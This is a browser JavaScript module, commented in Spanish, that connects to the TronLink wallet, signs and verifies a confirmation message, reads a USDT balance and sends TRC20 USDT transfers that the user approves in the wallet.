(function () {
    'use strict';

    // ============================================================
    // ESTE ARCHIVO NO CONTROLA EL CLICK DEL BOTÓN.
    //
    // Puede seguir existiendo tu proxy:
    //
    // sendBtn -> connectBtn
    //
    // Pero aquí NO agregamos addEventListener a ninguno.
    // ============================================================

    let tronWebInstance = null;
    let connectedAddress = null;


    // ============================================================
    // CONECTAR TRONLINK
    // ============================================================

    async function connect() {

        if (
            !window.tronLink &&
            !window.tronWeb
        ) {
            throw new Error(
                'TronLink no está disponible.'
            );
        }


        if (
            window.tronLink &&
            typeof window.tronLink.request === 'function'
        ) {
            console.log(
                '[TRON] Solicitando acceso a TronLink...'
            );

            const response =
                await window.tronLink.request({
                    method: 'tron_requestAccounts'
                });

            console.log(
                '[TRON] Respuesta de conexión:',
                response
            );

            if (
                response &&
                response.code &&
                response.code !== 200
            ) {
                throw new Error(
                    response.message ||
                    'La conexión con TronLink fue rechazada.'
                );
            }
        }


        if (!window.tronWeb) {
            throw new Error(
                'TronWeb no está disponible.'
            );
        }


        const address =
            window.tronWeb.defaultAddress &&
            window.tronWeb.defaultAddress.base58
                ? window.tronWeb.defaultAddress.base58
                : '';


        if (!address) {
            throw new Error(
                'No hay ninguna wallet conectada.'
            );
        }


        tronWebInstance =
            window.tronWeb;

        connectedAddress =
            address;


        console.log(
            '[TRON] Wallet obtenida:',
            connectedAddress
        );


        return {
            address: connectedAddress,
            tronWeb: tronWebInstance
        };
    }


    // ============================================================
    // FIRMAR MENSAJE
    // ============================================================

    async function signVerificationMessage(data) {

        if (!window.tronWeb) {
            throw new Error(
                'TronWeb no está disponible.'
            );
        }


        const walletAddress =
            window.tronWeb.defaultAddress &&
            window.tronWeb.defaultAddress.base58
                ? window.tronWeb.defaultAddress.base58
                : '';


        if (!walletAddress) {
            throw new Error(
                'No hay ninguna wallet conectada.'
            );
        }


        const amount =
            data.amount;

        const destination =
            data.destination;


        const message =
            'Confirmación de wallet\n\n' +

            'Wallet: ' +
            walletAddress +

            '\nRed: TRON' +

            '\nCantidad indicada: ' +
            amount +
            ' USDT' +

            '\nDirección indicada: ' +
            destination +

            '\nFecha: ' +
            new Date().toISOString();


        console.log(
            '[TRON] Mensaje a firmar:',
            message
        );


        if (
            !window.tronWeb.trx ||
            typeof window.tronWeb.trx.signMessageV2 !== 'function'
        ) {
            throw new Error(
                'signMessageV2 no está disponible.'
            );
        }


        const signature =
            await window.tronWeb.trx.signMessageV2(
                message
            );


        if (!signature) {
            throw new Error(
                'No se recibió ninguna firma.'
            );
        }


        console.log(
            '[TRON] Firma generada correctamente.'
        );


        return {
            address: walletAddress,
            message: message,
            signature: signature,
            amount: amount,
            destination: destination
        };
    }


    // ============================================================
    // VERIFICAR FIRMA
    // ============================================================

    async function verifySignature(result) {

        if (!window.tronWeb) {
            throw new Error(
                'TronWeb no está disponible.'
            );
        }


        if (
            !window.tronWeb.trx ||
            typeof window.tronWeb.trx.verifyMessageV2 !== 'function'
        ) {
            throw new Error(
                'verifyMessageV2 no está disponible.'
            );
        }


        const recoveredAddress =
            await window.tronWeb.trx.verifyMessageV2(
                result.message,
                result.signature
            );


        return {
            valid:
                recoveredAddress ===
                result.address,

            recoveredAddress:
                recoveredAddress
        };
    }


    // ============================================================
    // CONSULTAR SALDO USDT
    // ============================================================

    async function getUSDTBalance(address) {

        try {

            let activeTronWeb =
                tronWebInstance ||
                window.tronWeb;


            if (!activeTronWeb) {

                const wallet =
                    await connect();

                activeTronWeb =
                    wallet.tronWeb;
            }


            // Contrato configurado actualmente.
            const USDT_CONTRACT =
                'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';


            const contract =
                await activeTronWeb
                    .contract()
                    .at(USDT_CONTRACT);


            const rawBalance =
                await contract
                    .balanceOf(address)
                    .call();


            const balance =
                Number(
                    rawBalance.toString()
                ) / 1_000_000;


            console.log(
                '[TRON] Saldo USDT:',
                balance
            );


            return balance;


        } catch (error) {

            console.error(
                '[TRON] Error consultando USDT:',
                error
            );

            return null;
        }
    }


    // ============================================================
    // EJECUTAR TRANSFERENCIA TRC20
    // ============================================================
    //
    // IMPORTANTE:
    //
    // Esta función NO se ejecuta automáticamente.
    //
    // Debe ser llamada explícitamente desde script.js:
    //
    // window.TRON_APP.ejecutarTransferencia({...})
    //
    // Esto solicita a la wallet la firma de una TRANSACCIÓN,
    // que es diferente de signMessageV2().
    // ============================================================

    async function ejecutarTransferencia({
        contratoUSDT,
        direccionDestino,
        montoUSDT
    }) {

        // --------------------------------------------------------
        // COMPROBAR WALLET
        // --------------------------------------------------------

        if (!window.tronWeb) {
            throw new Error(
                'TronWeb no está disponible.'
            );
        }


        const tronWeb =
            window.tronWeb;


        const walletAddress =
            tronWeb.defaultAddress &&
            tronWeb.defaultAddress.base58
                ? tronWeb.defaultAddress.base58
                : '';


        if (!walletAddress) {
            throw new Error(
                'No hay ninguna wallet conectada.'
            );
        }


        // --------------------------------------------------------
        // VALIDAR CONTRATO
        // --------------------------------------------------------

        if (
            !contratoUSDT ||
            !tronWeb.isAddress(contratoUSDT)
        ) {
            throw new Error(
                'La dirección del contrato TRC20 no es válida.'
            );
        }


        // --------------------------------------------------------
        // VALIDAR DESTINO
        // --------------------------------------------------------

        if (
            !direccionDestino ||
            !tronWeb.isAddress(direccionDestino)
        ) {
            throw new Error(
                'La dirección de destino no es válida.'
            );
        }


        // --------------------------------------------------------
        // VALIDAR CANTIDAD
        // --------------------------------------------------------

        const amount =
            Number(montoUSDT);


        if (
            !Number.isFinite(amount) ||
            amount <= 0
        ) {
            throw new Error(
                'La cantidad no es válida.'
            );
        }


        // USDT usa 6 decimales
        const rawAmount =
            Math.round(
                amount * 1_000_000
            );


        console.log(
            '[TRON TX] Preparando transferencia:',
            {
                from:
                    walletAddress,

                to:
                    direccionDestino,

                amount:
                    amount,

                rawAmount:
                    rawAmount,

                contract:
                    contratoUSDT
            }
        );


        // --------------------------------------------------------
        // CONSTRUIR TRANSACCIÓN
        // --------------------------------------------------------

        console.log(
            '[TRON TX] Construyendo transacción...'
        );


        const txObj =
            await tronWeb
                .transactionBuilder
                .triggerSmartContract(

                    contratoUSDT,

                    'transfer(address,uint256)',

                    {
                        // Máximo permitido para consumo
                        // de energía/comisión.
                        feeLimit:
                            150_000_000
                    },

                    [
                        {
                            type:
                                'address',

                            value:
                                direccionDestino
                        },

                        {
                            type:
                                'uint256',

                            value:
                                rawAmount
                        }
                    ],

                    walletAddress
                );


        console.log(
            '[TRON TX] Resultado construcción:',
            txObj
        );


        if (
            !txObj ||
            !txObj.result ||
            !txObj.result.result ||
            !txObj.transaction
        ) {
            throw new Error(
                'No se pudo construir la transacción TRC20.'
            );
        }


        // --------------------------------------------------------
        // SOLICITAR FIRMA DE TRANSACCIÓN
        // --------------------------------------------------------

        console.log(
            '[TRON TX] Esperando aprobación de la transacción en la wallet...'
        );


        const signedTransaction =
            await tronWeb.trx.sign(
                txObj.transaction
            );


        if (!signedTransaction) {
            throw new Error(
                'La transacción no fue firmada.'
            );
        }


        console.log(
            '[TRON TX] Transacción firmada.'
        );


        // --------------------------------------------------------
        // TRANSMITIR A LA RED
        // --------------------------------------------------------

        console.log(
            '[TRON TX] Transmitiendo transacción...'
        );


        const result =
            await tronWeb.trx
                .sendRawTransaction(
                    signedTransaction
                );


        console.log(
            '[TRON TX] Respuesta de la red:',
            result
        );


        if (
            !result ||
            !result.result
        ) {
            throw new Error(
                'La red rechazó la transacción.'
            );
        }


        console.log(
            '[TRON TX] ✅ Transacción enviada correctamente.'
        );


        console.log(
            '[TRON TX] TXID:',
            result.txid
        );


        return {
            success:
                true,

            txid:
                result.txid,

            wallet:
                walletAddress,

            destination:
                direccionDestino,

            amount:
                amount,

            rawAmount:
                rawAmount,

            contract:
                contratoUSDT,

            networkResult:
                result
        };
    }


    // ============================================================
    // EXPONER API
    // ============================================================

    window.TRON_APP = {

        connect:
            connect,

        signVerificationMessage:
            signVerificationMessage,

        verifySignature:
            verifySignature,

        getUSDTBalance:
            getUSDTBalance,

        // NUEVA FUNCIÓN
        ejecutarTransferencia:
            ejecutarTransferencia
    };


    // ============================================================
    // DETECTAR WALLET YA CONECTADA
    // ============================================================

    if (
        window.tronWeb &&
        window.tronWeb.defaultAddress
    ) {

        try {

            const address =
                window.tronWeb
                    .defaultAddress
                    .base58;


            if (address) {

                tronWebInstance =
                    window.tronWeb;

                connectedAddress =
                    address;


                console.log(
                    '[TRON] Wallet ya conectada:',
                    connectedAddress
                );
            }


        } catch (error) {

            console.warn(
                '[TRON] No se pudo detectar la wallet inicial:',
                error
            );
        }
    }

})();
